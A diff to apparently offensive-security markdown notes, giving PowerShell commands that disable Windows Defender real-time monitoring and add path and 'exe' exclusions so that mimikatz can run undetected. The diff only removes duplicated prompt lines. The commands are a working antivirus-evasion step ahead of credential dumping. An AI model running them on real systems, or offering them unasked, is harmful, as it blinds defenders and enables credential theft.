@@ -52,18 +52,12 @@ Invoke-HostRecon
 1. Disable AV
 
 ```PowerShell
-PS C:\Users\Administrator\Desktop> Set-MpPreference -DisableRealTimeMonitoring $true
 Set-MpPreference -DisableRealTimeMonitoring $true
-
 ```
 
 2. Add two rules to exclude mimikatz. One for exclude Desktop path, another to exclude "exe" extensions.
 
 ```powershell
-PS C:\Users\Administrator\Desktop> Set-MpPreference -ExclusionPath \Users\Administrator\Desktop
 Set-MpPreference -ExclusionPath \Users\Administrator\Desktop
-PS C:\Users\Administrator\Desktop> Set-MpPreference -ExclusionPath C:\Users\Administrator\Desktop
-et-MpPreference -ExclusionPath C:\Users\Administrator\Desktop
-PS C:\Users\Administrator\Desktop> Set-MpPreference -ExclusionExtension exe
 Set-MpPreference -ExclusionExtension exe
 ```
